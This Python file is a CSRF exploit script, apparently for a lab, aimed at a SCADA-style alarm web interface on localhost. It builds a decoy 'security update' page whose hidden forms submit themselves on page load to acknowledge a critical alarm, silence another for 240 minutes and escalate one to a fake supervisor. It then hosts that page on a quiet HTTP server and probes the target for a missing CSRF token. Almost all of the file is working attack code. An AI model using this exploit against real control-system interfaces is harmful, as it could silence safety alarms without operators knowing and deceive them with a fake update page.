#!/usr/bin/env python3
"""
CSRF Attack Exploitation Script
Demonstrates Cross-Site Request Forgery vulnerability
"""

import requests
from http.server import HTTPServer, SimpleHTTPRequestHandler
import threading
import time

# Configuration
TARGET_URL = "http://localhost:5000"
ATTACKER_SERVER_PORT = 8080

# Create malicious HTML page
MALICIOUS_HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>SCADA System Update</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 50px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
        }
        .loading {
            font-size: 24px;
            margin-top: 20px;
        }
        .spinner {
            border: 8px solid #f3f3f3;
            border-top: 8px solid #667eea;
            border-radius: 50%;
            width: 60px;
            height: 60px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <h1>üîÑ Installing Security Update</h1>
    <div class="spinner"></div>
    <div class="loading">Please wait while we update your system...</div>
    
    <!-- Hidden forms that auto-submit -->
    <!-- CSRF Attack 1: Acknowledge critical alarm -->
    <form id="csrf1" method="POST" action="{target}/acknowledge/1" style="display:none;">
    </form>
    
    <!-- CSRF Attack 2: Silence alarm -->
    <form id="csrf2" method="POST" action="{target}/silence/3" style="display:none;">
        <input name="duration" value="240">
    </form>
    
    <!-- CSRF Attack 3: Escalate alarm to fake supervisor -->
    <form id="csrf3" method="POST" action="{target}/escalate/5" style="display:none;">
        <input name="supervisor" value="fake_supervisor">
    </form>
    
    <script>
        // Auto-submit all forms when page loads
        window.onload = function() {{
            console.log('CSRF Attack: Submitting forms...');
            document.getElementById('csrf1').submit();
            setTimeout(() => document.getElementById('csrf2').submit(), 1000);
            setTimeout(() => document.getElementById('csrf3').submit(), 2000);
            
            // Show success message after attacks
            setTimeout(() => {{
                document.body.innerHTML = '<h1>‚úÖ Update Complete!</h1><p>Your system has been updated.</p>';
            }}, 3000);
        }}
    </script>
</body>
</html>
""".format(target=TARGET_URL)

def create_malicious_page():
    """Create the malicious HTML file"""
    with open('/tmp/csrf_attack.html', 'w') as f:
        f.write(MALICIOUS_HTML)
    print(f"‚úÖ Created malicious page: /tmp/csrf_attack.html")

def start_server():
    """Start HTTP server to host malicious page"""
    import os
    os.chdir('/tmp')
    
    class QuietHandler(SimpleHTTPRequestHandler):
        def log_message(self, format, *args):
            pass
    
    server = HTTPServer(('0.0.0.0', ATTACKER_SERVER_PORT), QuietHandler)
    print(f"‚úÖ Started HTTP server on port {ATTACKER_SERVER_PORT}")
    print(f"üìÑ Malicious page: http://localhost:{ATTACKER_SERVER_PORT}/csrf_attack.html")
    server.serve_forever()

def verify_vulnerability():
    """Check if target is vulnerable to CSRF"""
    print("\nüîç Testing CSRF vulnerability...")
    
    try:
        # Try to acknowledge an alarm without CSRF token
        response = requests.post(
            f"{TARGET_URL}/acknowledge/1",
            cookies={'session': 'dummy_session'},
            allow_redirects=False,
            timeout=5
        )
        
        if response.status_code == 302:
            print("‚úÖ Target is VULNERABLE to CSRF (no token required)")
            return True
        elif response.status_code == 403:
            print("‚ùå Target is PROTECTED (CSRF token required)")
            return False
        else:
            print(f"‚ö†Ô∏è  Unexpected response: {response.status_code}")
            return False
            
    except Exception as e:
        print(f"‚ùå Error testing vulnerability: {e}")
        return False

def main():
    print("=" * 60)
    print("CSRF Attack Demonstration")
    print("=" * 60)
    print(f"Target: {TARGET_URL}")
    print(f"Attacker Server: http://localhost:{ATTACKER_SERVER_PORT}")
    print()
    
    # Create malicious page
    create_malicious_page()
    
    # Verify vulnerability
    is_vulnerable = verify_vulnerability()
    
    if not is_vulnerable:
        print("\n‚ö†Ô∏è  Target appears to be patched!")
        print("This script demonstrates the attack on the vulnerable version.")
        return
    
    print("\nüìã Attack Steps:")
    print("1. Attacker creates malicious webpage (done)")
    print("2. Attacker starts web server (starting...)")
    print("3. Victim (authenticated user) visits the malicious page")
    print("4. Victim's browser automatically submits forms")
    print("5. Critical alarms are acknowledged without user knowledge")
    
    print("\nüöÄ Starting attack server...")
    print(f"\nüëâ To execute attack:")
    print(f"   1. Login to {TARGET_URL} in your browser")
    print(f"   2. Visit: http://localhost:{ATTACKER_SERVER_PORT}/csrf_attack.html")
    print(f"   3. Watch alarms get automatically acknowledged")
    print("\nPress Ctrl+C to stop the server\n")
    
    try:
        # Start server in background
        server_thread = threading.Thread(target=start_server, daemon=True)
        server_thread.start()
        
        # Keep main thread alive
        while True:
            time.sleep(1)
            
    except KeyboardInterrupt:
        print("\n\n‚úã Server stopped")
        print("=" * 60)

if __name__ == "__main__":
    main()
